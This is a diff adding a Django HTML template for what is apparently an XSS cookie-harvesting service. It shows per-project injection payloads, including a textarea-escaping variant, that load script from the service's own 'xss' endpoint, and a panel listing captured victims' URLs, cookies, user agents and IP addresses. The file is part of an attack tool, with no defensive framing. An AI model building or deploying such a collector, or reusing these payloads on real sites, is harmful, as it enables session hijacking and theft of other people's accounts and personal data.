@@ -1,0 +1,47 @@
+{% extends "base.html" %}
+{% block title %}Project {{ project.title }}{% endblock %}
+
+{% block body %}
+{% include "_nav_bar.html" %}
+<div class="container">
+    <div class="project">
+        <div class="project_description">
+            <h3>{{ project.title }}</h3>
+
+            <p>Create time:{{ project.create_time|date:"Y-m-d H:i:s" }}</p>
+            <hr/>
+            <div class="instruction">
+                <p>How to use?</p>
+                <p><code>&ltscript src="{{ base_url }}xss?id={{ project.id }}"&lt/script&gt</code></p>
+                <p><code>&lt/textarea&gt'"&gt&ltscript src="{{ base_url }}xss?id={{ project.id }}"&lt/script&gt</code></p>
+            </div>
+        </div>
+        <hr/>
+        <div class="project_records">
+            <div class="panel panel-default">
+                <div class="panel-body">
+                    {% if not project.records.all %}
+                    <p>No cookies</p>
+                    {% else %}
+                        {% for record in project.records.all reversed %}
+                            <div class="record">
+                                <p>Record id:<span class="badge">{{ record.id }}</span></p>
+
+                                <p>Create time:{{ record.create_time|date:"Y-m-d H:i:s" }}</p>
+
+                                <p>Url:<code>{{ record.title }}</code></p>
+                                <p>Cookie:
+                                <code>{{ record.cookie }}</code></p>
+                                <p>User agent:<code>{{ record.user_agent }}</code></p>
+
+                                <p>ip:<code>{{ record.ip }}</code></p>
+                                <hr/>
+                            </div>
+                        {% endfor %}
+                    {% endif %}
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
